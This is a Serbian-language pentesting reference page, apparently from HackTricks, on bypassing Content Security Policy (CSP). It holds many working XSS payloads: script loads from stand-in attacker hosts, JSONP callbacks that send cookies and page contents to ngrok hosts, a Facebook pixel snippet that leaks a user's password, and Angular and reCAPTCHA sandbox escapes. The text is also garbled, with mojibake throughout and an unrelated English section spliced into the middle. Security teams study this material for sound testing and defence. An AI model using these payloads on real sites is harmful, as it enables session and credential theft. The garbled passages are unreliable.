# Content Security Policy (CSP) Bypass

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Uvidi u hakovanje**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovije najave**\
Budite informisani o najnovijim nagradama za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platformi

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

## Å ta je CSP

Politika bezbednosti sadrÅ¾aja (CSP) prepoznata je kao tehnologija pregledaÄa, pre svega namenjena **zaÅ¡titi od napada poput skriptovanja preko razliÄitih sajtova (XSS)**. FunkcioniÅ¡e tako Å¡to definiÅ¡e i detaljno opisuje putanje i izvore sa kojih pregledaÄ moÅ¾e bezbedno uÄitati resurse. Ovi resursi obuhvataju razliÄite elemente poput slika, okvira i JavaScript-a. Na primer, politika moÅ¾e dozvoliti uÄitavanje i izvrÅ¡avanje resursa sa istog domena (self), ukljuÄujuÄ‡i i inline resurse i izvrÅ¡avanje koda u obliku stringa putem funkcija poput `eval`, `setTimeout` ili `setInterval`.

Implementacija CSP-a se vrÅ¡i putem **zaglavlja odgovora** ili ukljuÄivanjem **meta elemenata u HTML stranicu**. Prema ovoj politici, pregledaÄi proaktivno sprovode ove odredbe i odmah blokiraju otkrivene povrede.

* Implementirano putem zaglavlja odgovora:

```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```

* Implementirano putem meta oznake:

```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```

### Zaglavlja

CSP moÅ¾e biti sproveden ili praÄ‡en koriÅ¡Ä‡enjem ovih zaglavlja:

* `Content-Security-Policy`: Sprovodi CSP; pregledaÄ blokira svako krÅ¡enje.
* `Content-Security-Policy-Report-Only`: Koristi se za praÄ‡enje; prijavljuje krÅ¡enja bez blokiranja. Idealno za testiranje u preprodukcionim okruÅ¾enjima.

### Definisanje Resursa

CSP ograniÄava poreklo za uÄitavanje kako aktivnog tako i pasivnog sadrÅ¾aja, kontroliÅ¡uÄ‡i aspekte poput izvrÅ¡avanja inline JavaScript-a i koriÅ¡Ä‡enja `eval()`. Primer politike je:

```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```

### Direktive

* **script-src**: Dozvoljava odreÄ‘ene izvore za JavaScript, ukljuÄujuÄ‡i URL-ove, inline skripte i skripte pokrenute putem dogaÄ‘aja ili XSLT stilova.
* **default-src**: Postavlja podrazumevanu politiku za preuzimanje resursa kada odreÄ‘ene direktive za preuzimanje nisu prisutne.
* **child-src**: Specificira dozvoljene resurse za web radnike i ugraÄ‘ene sadrÅ¾aje okvira.
* **connect-src**: OgraniÄava URL-ove koji se mogu uÄitati koristeÄ‡i interfejse poput fetch, WebSocket, XMLHttpRequest.
* **frame-src**: OgraniÄava URL-ove za okvire.
* **frame-ancestors**: Specificira koje izvore mogu ugraditi trenutnu stranicu, primenjivo na elemente poput `<frame>`, `<iframe>`, `<object>`, `<embed>`, i `<applet>`.
* **img-src**: DefiniÅ¡e dozvoljene izvore za slike.
* **font-src**: Specificira validne izvore za fontove uÄitane koristeÄ‡i `@font-face`.
* **manifest-src**: DefiniÅ¡e dozvoljene izvore fajlova manifesta aplikacije.
* **media-src**: DefiniÅ¡e dozvoljene izvore za uÄitavanje medijskih objekata.
* **object-src**: DefiniÅ¡e dozvoljene izvore za elemente `<object>`, `<embed>`, i `<applet>`.
* **base-uri**: Specificira dozvoljene URL-ove za uÄitavanje koristeÄ‡i elemente `<base>`.
* **form-action**: Navodi validne endpointe za podnoÅ¡enje formi.
* **plugin-types**: OgraniÄava mime tipove koje stranica moÅ¾e pozvati.
* **upgrade-insecure-requests**: NareÄ‘uje pregledaÄima da prepiÅ¡u HTTP URL-ove u HTTPS.
* **sandbox**: Primenjuje ograniÄenja sliÄna atributu sandbox za `<iframe>`.
* **report-to**: Specificira grupu kojoj Ä‡e izveÅ¡taj biti poslat ako je politika prekrÅ¡ena.
* **worker-src**: Specificira validne izvore za Worker, SharedWorker, ili ServiceWorker skripte.
* **prefetch-src**: Specificira validne izvore za resurse koji Ä‡e biti preuzeti ili predpreuzeti.
* **navigate-to**: OgraniÄava URL-ove na koje dokument moÅ¾e navigirati na bilo koji naÄin (a, forma, window.location, window.open, itd.)

### Izvori

* `*`: Dozvoljava sve URL-ove osim onih sa Å¡emama `data:`, `blob:`, `filesystem:`.
* `'self'`: Dozvoljava uÄitavanje sa istog domena.
* `'data'`: Dozvoljava resurse da se uÄitavaju putem data Å¡eme (npr. Base64 enkodirane slike).
* `'none'`: Blokira uÄitavanje sa bilo kog izvora.
* `'unsafe-eval'`: Dozvoljava koriÅ¡Ä‡enje `eval()` i sliÄnih metoda, nije preporuÄljivo iz sigurnosnih razloga.
* `'unsafe-hashes'`: OmoguÄ‡ava specifiÄne inline event handlere.
* `'unsafe-inline'`: Dozvoljava koriÅ¡Ä‡enje inline resursa poput inline `<script>` ili `<style>`, nije preporuÄljivo iz sigurnosnih razloga.
* `'nonce'`: Bela lista za specifiÄne inline skripte koriÅ¡Ä‡enjem kriptografskog nonce-a (broj koriÅ¡Ä‡en jednom).
* Ako imate ograniÄeno izvrÅ¡avanje JS-a, moguÄ‡e je dobiti koriÅ¡Ä‡eni nonce unutar stranice sa `doc.defaultView.top.document.querySelector("[nonce]")` i zatim ga ponovo koristiti za uÄitavanje zlonamerne skripte (ako je koriÅ¡Ä‡en strict-dynamic, bilo koji dozvoljeni izvor moÅ¾e uÄitati nove izvore pa ovo nije potrebno), kao u:

<details>

<summary>UÄitavanje skripte ponovnim koriÅ¡Ä‡enjem nonce-a</summary>

\`\`\`html ![](https://github.com/carlospolop/hacktricks/blob/rs/pentesting-web/content-security-policy-csp-bypass/x) \`\`\`

</details>

* `'sha256-<hash>'`: Whitelists scripts with a specific sha256 hash.
* `'strict-dynamic'`: Dozvoljava uÄitavanje skripti sa bilo kog izvora ako je dodat na belu listu pomoÄ‡u nonce-a ili heÅ¡a.
* `'host'`: Specificira odreÄ‘eni domen, kao Å¡to je `example.com`.
* `https:`: OgraniÄava URL-ove na one koji koriste HTTPS.
* `blob:`: Dozvoljava resursima da se uÄitavaju sa Blob URL-ova (npr. Blob URL-ova kreiranih putem JavaScript-a).
* `filesystem:`: Dozvoljava resursima da se uÄitavaju sa fajl sistema.
* `'report-sample'`: UkljuÄuje uzorak koda koji krÅ¡i pravila u izveÅ¡taju o krÅ¡enju (korisno za debagovanje).
* `'strict-origin'`: SliÄno kao 'self', ali osigurava da nivo sigurnosti protokola izvora odgovara dokumentu (samo sigurni izvori mogu uÄitavati resurse sa sigurnih izvora).
* `'strict-origin-when-cross-origin'`: Å alje kompletne URL-ove prilikom pravljenja zahteva istog izvora, ali Å¡alje samo poreklo kada je zahtev preko granice izvora.
* `'unsafe-allow-redirects'`: Dozvoljava uÄitavanje resursa koji Ä‡e odmah preusmeriti na drugi resurs. Nije preporuÄljivo jer oslabljuje sigurnost.

## Nekorektna CSP pravila

### 'unsafe-inline'

```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```

Radni payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' putem Iframe-ova

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'

```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```

Radni payload:

```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

### strict-dynamic

Ako na neki naÄin moÅ¾ete da naterate **dozvoljeni JS kod da kreira novi tag skripte** u DOM-u sa vaÅ¡im JS kodom, jer ga kreira dozvoljeni skript, **novi tag skripte Ä‡e biti dozvoljen za izvrÅ¡avanje**.

### Zvezdica (\*)

```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```

Radni payload:

```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```

### Nedostatak object-src i default-src

{% hint style="danger" %}
**Izgleda da ovo viÅ¡e ne funkcioniÅ¡e**
{% endhint %}

```yaml
Content-Security-Policy: script-src 'self' ;
```

Radni payloadi:

```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```

### Postavljanje datoteka + 'self'

```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```

Ako moÅ¾ete da otpremite JS fajl, moÅ¾ete zaobiÄ‡i ovaj CSP:

Radna payload:

```markup
"/>'><script src="/uploads/picture.png.js"></script>
```

MeÄ‘utim, vrlo je verovatno da server **validira** otpremljeni fajl i dozvoljava samo da se **otpreme odreÄ‘eni tipovi fajlova**.

Å taviÅ¡e, Äak i ako biste mogli da otpremite **JS kod unutar** fajla koristeÄ‡i ekstenziju koju server prihvata (kao Å¡to je: _script.png_), to neÄ‡e biti dovoljno jer neki serveri poput apache servera **biraju MIME tip fajla na osnovu ekstenzije** i pregledaÄi poput Chrome-a Ä‡e **odbaciti izvrÅ¡avanje Javascript** koda unutar neÄega Å¡to bi trebalo da bude slika. "Na sreÄ‡u", postoje greÅ¡ke. Na primer, iz jednog CTF-a sam nauÄio da **Apache ne prepoznaje** ekstenziju _**.wave**_, stoga je ne servira sa **MIME tipom kao audio/\***.

Odavde, ako pronaÄ‘ete XSS i otpremanje fajla, i uspete da pronaÄ‘ete **pogreÅ¡no tumaÄenu ekstenziju**, moÅ¾ete pokuÅ¡ati da otpremite fajl sa tom ekstenzijom i sadrÅ¾ajem skripte. Ili, ako server proverava ispravan format otpremljenog fajla, kreirajte poliglot ([neki primeri poliglota ovde](https://github.com/Polydet/polyglot-database)).

### Form-action

Ako nije moguÄ‡e ubaciti JS, joÅ¡ uvek moÅ¾ete pokuÅ¡ati da eksfiltrirate na primer kredencijale **ubacivanjem akcije forme** (i moÅ¾da oÄekujuÄ‡i da menadÅ¾eri lozinki automatski popune lozinke). MoÅ¾ete pronaÄ‡i [**primer u ovom izveÅ¡taju**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). TakoÄ‘e, primetite da `default-src` ne pokriva akcije formi.

### Endpoziti treÄ‡ih strana + ('unsafe-eval')

{% hint style="warning" %}
Za neke od sledeÄ‡ih payloada **`unsafe-eval` nije Äak ni potreban**.
{% endhint %}

```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```

UÄitajte ranjivu verziju Angular-a i izvrÅ¡ite proizvoljni JS:

```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```

#### Payloadi koji koriste Angular + biblioteku sa funkcijama koje vraÄ‡aju `window` objekat ([proverite ovaj post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
Post pokazuje da biste mogli **uÄitati** sve **biblioteke** sa `cdn.cloudflare.com` (ili bilo kojeg drugog dozvoljenog repozitorijuma JS biblioteka), izvrÅ¡iti sve dodate funkcije iz svake biblioteke, i proveriti **koje funkcije iz kojih biblioteka vraÄ‡aju `window` objekat**.
{% endhint %}

```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```

### Angular XSS iz naziva klase:

***

### Angular XSS Ğ¸Ğ· Ğ¸Ğ¼ĞµÑšĞ° ĞºĞ»Ğ°ÑĞµ:

```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```

#### Zloupotreba google recaptcha JS koda

Prema [**ovom CTF writeup-u**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves) moÅ¾ete zloupotrebiti [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) unutar CSP-a da biste izvrÅ¡ili proizvoljni JS kod zaobiÄ‡i CSP:

```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```

ViÅ¡e [**payloada iz ovog Älanka**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):

```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```

#### Zloupotreba www.google.com za otvoreno preusmeravanje

SledeÄ‡i URL preusmerava na example.com (odavde).

```
https://www.google.com/amp/s/example.com/
```

Zloupotreba \*.google.com/script.google.com

MoguÄ‡e je zloupotrebiti Google Apps Script kako bi se primile informacije na stranici unutar script.google.com. Kao Å¡to je [uradjeno u ovom izveÅ¡taju](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### TreÄ‡e strane Endpoints + JSONP

```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```

Scenariji poput ovog gde je `script-src` postavljen na `self` i odreÄ‘eni domen koji je dodat na belu listu mogu biti zaobiÄ‘eni koriÅ¡Ä‡enjem JSONP-a. JSONP endpointi dozvoljavaju nesigurne povratne metode koje omoguÄ‡avaju napadaÄu da izvrÅ¡i XSS, radno optereÄ‡enje:

```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

[**JSONBee**](https://github.com/zigoo0/JSONBee) **sadrÅ¾i spremne JSONP endpointove za CSP zaobilaÅ¾enje razliÄitih veb lokacija.**

Ista ranjivost Ä‡e se desiti ako **pouzdani endpoint sadrÅ¾i Preusmeravanje otvorenog redirekta** jer ako je poÄetni endpoint pouzdan, preusmeravanja su pouzdana.

### Zloupotrebe treÄ‡ih strana

Kao Å¡to je opisano u [sledeÄ‡em postu](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), postoji mnogo domena treÄ‡ih strana, koji bi mogli biti dozvoljeni negde u CSP-u, a mogu biti zloupotrebljeni da bi se ili eksfiltrirali podaci ili izvrÅ¡io JavaScript kod. Neke od ovih treÄ‡ih strana su:

| Entitet           | Dozvoljeni domen                             | MoguÄ‡nosti     |
| ----------------- | -------------------------------------------- | -------------- |
| Facebook          | www.facebook.com, \*.facebook.com            | Eksfil         |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Eksfil         |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | IzvrÅ¡i         |
| Amazon CloudFront | \*.cloudfront.net                            | Eksfil, IzvrÅ¡i |
| Amazon AWS        | \*.amazonaws.com                             | Eksfil, IzvrÅ¡i |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Eksfil, IzvrÅ¡i |
| Salesforce Heroku | \*.herokuapp.com                             | Eksfil, IzvrÅ¡i |
| Google Firebase   | \*.firebaseapp.com                           | Eksfil, IzvrÅ¡i |

Ako pronaÄ‘ete bilo koji od dozvoljenih domena u CSP-u vaÅ¡eg cilja, postoji moguÄ‡nost da moÅ¾ete zaobiÄ‡i CSP registracijom na uslugu treÄ‡e strane i, ili eksfiltrirati podatke na tu uslugu ili izvrÅ¡iti kod.

Na primer, ako pronaÄ‘ete sledeÄ‡i CSP:

```
Content-Security-Policyâ€‹: default-src 'selfâ€™ www.facebook.com;â€‹
```

## Bypassing Content Security Policy (CSP)

### Introduction

Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, such as Cross Site Scripting (XSS) and data injection attacks. However, in some cases, it is possible to bypass CSP protections using various techniques.

### Bypassing CSP using `unsafe-inline`

One common way to bypass CSP is by using the `unsafe-inline` keyword in the CSP header. This allows the execution of inline scripts and styles, which can be exploited by an attacker to execute malicious code.

### Bypassing CSP using data: URIs

Another technique to bypass CSP is by using data: URIs to embed external resources inline. By converting the external resource into a base64-encoded string, it can be included inline in the HTML document, bypassing CSP restrictions.

### Bypassing CSP using loopholes

Attackers can also exploit various loopholes in the CSP configuration to bypass its protections. This can include manipulating the policy directives, abusing browser quirks, or finding ways to evade CSP restrictions.

### Conclusion

While Content Security Policy is an effective security measure, it is important to be aware of the potential bypass techniques that attackers can use. Regularly reviewing and updating CSP configurations can help mitigate the risk of bypassing CSP protections.

```
Content-Security-Policyâ€‹: connect-src www.facebook.com;â€‹
```

Treba da moÅ¾ete da eksfiltrirate podatke, sliÄno kao Å¡to je to uvek raÄ‘eno sa [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). U ovom sluÄaju, pratite ove opÅ¡te korake:

1. Kreirajte Facebook Developer nalog ovde.
2. Napravite novu "Facebook Login" aplikaciju i izaberite "Website".
3. Idite na "Settings -> Basic" i dobijte svoj "App ID".
4. Na ciljnom sajtu sa kog Å¾elite da eksfiltrirate podatke, moÅ¾ete to uraditi direktno koristeÄ‡i Facebook SDK ureÄ‘aj "fbq" putem "customEvent" i podataka za prenos.
5. Idite na svoju aplikaciju "Event Manager" i izaberite aplikaciju koju ste kreirali (napomena: menadÅ¾er dogaÄ‘aja moÅ¾e se pronaÄ‡i na URL-u sliÄnom ovom: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events).
6. Izaberite karticu "Test Events" da biste videli dogaÄ‘aje koje Å¡alje "vaÅ¡" veb sajt.

Zatim, na strani Å¾rtve, izvrÅ¡ite sledeÄ‡i kod da biste inicijalizovali Facebook praÄ‡enje piksela da pokazuje ka aplikaciji napadaÄevog Facebook developer naloga i izdate prilagoÄ‘eni dogaÄ‘aj ovako:

```JavaScript
fbq('init', '1279785999289471');â€‹ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{â€‹
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"â€‹
});
```

### Bypass putem RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Pored pomenutog preusmeravanja zaobilaÅ¾enja ograniÄenja putanje, postoji joÅ¡ jedna tehnika nazvana Relative Path Overwrite (RPO) koja se moÅ¾e koristiti na nekim serverima.

Na primer, ako CSP dozvoljava putanju `https://example.com/scripts/react/`, moÅ¾e se zaobiÄ‡i na sledeÄ‡i naÄin:

```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```

Browser Ä‡e konaÄno uÄitati `https://example.com/scripts/angular/angular.js`.

Ovo funkcioniÅ¡e jer za pregledaÄ, uÄitavate datoteku nazvanu `..%2fangular%2fangular.js` smeÅ¡tenu pod `https://example.com/scripts/react/`, Å¡to je u skladu sa CSP.

Zato Ä‡e dekodirati to, efektivno zahtevajuÄ‡i `https://example.com/scripts/react/../angular/angular.js`, Å¡to je ekvivalentno sa `https://example.com/scripts/angular/angular.js`.

**IskoriÅ¡Ä‡avanjem ove neusaglaÅ¡enosti u interpretaciji URL-a izmeÄ‘u pregledaÄa i servera, pravila putanje mogu biti zaobiÄ‘ena**.

ReÅ¡enje je ne tretirati `%2f` kao `/` na serverskoj strani, osiguravajuÄ‡i doslednu interpretaciju izmeÄ‘u pregledaÄa i servera kako bi se izbegao ovaj problem.

Online Primer:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### IzvrÅ¡avanje JS preko iframes

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### nedostaje **base-uri**

Ako nedostaje direktiva **base-uri** moÅ¾ete je zloupotrebiti da izvrÅ¡ite [**dangling markup injection**](../dangling-markup-html-scriptless-injection/).

Osim toga, ako **stranica uÄitava skriptu koristeÄ‡i relativnu putanju** (kao Å¡to je `<script src="/js/app.js">`) koristeÄ‡i **Nonce**, moÅ¾ete zloupotrebiti **base** **tag** da naterate da se skripta **uÄita** sa **vaÅ¡eg servera postiÅ¾uÄ‡i XSS.**\
Ako je ranjiva stranica uÄitana sa **httpS**, koristite httpS URL u base.

```html
<base href="https://www.attacker.com/">
```

### AngularJS dogaÄ‘aji

SpecifiÄna politika poznata kao Politika bezbednosti sadrÅ¾aja (CSP) moÅ¾e ograniÄiti JavaScript dogaÄ‘aje. MeÄ‘utim, AngularJS uvodi prilagoÄ‘ene dogaÄ‘aje kao alternativu. U okviru dogaÄ‘aja, AngularJS pruÅ¾a jedinstveni objekat `$event`, koji se odnosi na nativni objekat dogaÄ‘aja pregledaÄa. Ovaj objekat `$event` moÅ¾e biti iskoriÅ¡Ä‡en kako bi se zaobiÅ¡ao CSP. Posebno, u Chrome-u, objekat `$event/event` poseduje atribut `path`, koji sadrÅ¾i niz objekata povezanih sa lancem izvrÅ¡enja dogaÄ‘aja, pri Äemu je objekat `window` uvek pozicioniran na kraju. Ova struktura je kljuÄna za taktike za izbegavanje peska.

Usmeravanjem ovog niza ka filteru `orderBy`, moguÄ‡e je iterirati preko njega, iskoriÅ¡Ä‡avajuÄ‡i terminalni element (objekat `window`) kako bi se pokrenula globalna funkcija poput `alert()`. Demonstrirani odlomak koda ispod objaÅ¡njava ovaj proces:

```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```

Ovaj isjeÄak istiÄe upotrebu `ng-focus` direktive za pokretanje dogaÄ‘aja, koriÅ¡Ä‡enje `$event.path|orderBy` za manipulaciju nizom `path`, i iskoriÅ¡Ä‡avanje `window` objekta za izvrÅ¡avanje funkcije `alert()`, otkrivajuÄ‡i tako `document.cookie`.

**PronaÄ‘ite druge Angular zaobilaze na** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS i belaÄki domen

```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```

CSP politika koja beleÅ¾i domene za uÄitavanje skripti u Angular JS aplikaciji moÅ¾e biti zaobiÄ‘ena pozivom povratnih funkcija i odreÄ‘enih ranjivih klasa. Dodatne informacije o ovoj tehnici mogu se pronaÄ‡i u detaljnom vodiÄu dostupnom na ovom [git repozitorijumu](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).

Radni payloadi:

```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```

Drugi JSONP proizvoljni izvrÅ¡ni endpointi mogu se pronaÄ‡i [**ovde**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (neki od njih su obrisani ili popravljeni)

### Bypass putem preusmeravanja

Å ta se deÅ¡ava kada CSP naiÄ‘e na preusmeravanje na serverskoj strani? Ako preusmeravanje vodi ka drugom poreklu koje nije dozvoljeno, i dalje Ä‡e ne uspeti.

MeÄ‘utim, prema opisu u [CSP specifikaciji 4.2.2.3. Putanje i preusmeravanja](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), ako preusmeravanje vodi ka drugoj putanji, moÅ¾e zaobiÄ‡i originalna ograniÄenja.

Evo primera:

```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```

Ako je CSP postavljen na `https://www.google.com/a/b/c/d`, s obzirom da se putanja uzima u obzir, i skripte `/test` i `/a/test` Ä‡e biti blokirane od strane CSP.

MeÄ‘utim, konaÄni `http://localhost:5555/301` Ä‡e biti **preusmeren na serverskoj strani na `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. BuduÄ‡i da je u pitanju preusmerenje, **putanja se ne uzima u obzir**, i **skripta moÅ¾e biti uÄitana**, Äime se zaobilazi ograniÄenje putanje.

Sa ovim preusmerenjem, Äak i ako je putanja potpuno navedena, i dalje Ä‡e biti zaobiÄ‘ena.

Stoga, najbolje reÅ¡enje je osigurati da veb lokacija nema otvorene ranjivosti za preusmeravanje i da ne postoje domeni koji mogu biti iskoriÅ¡Ä‡eni u pravilima CSP.

### ZaobilaÅ¾enje CSP pomoÄ‡u viseÄ‡eg markupa

ProÄitajte [ovde](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; putem XSS

```
default-src 'self' 'unsafe-inline'; img-src *;
```

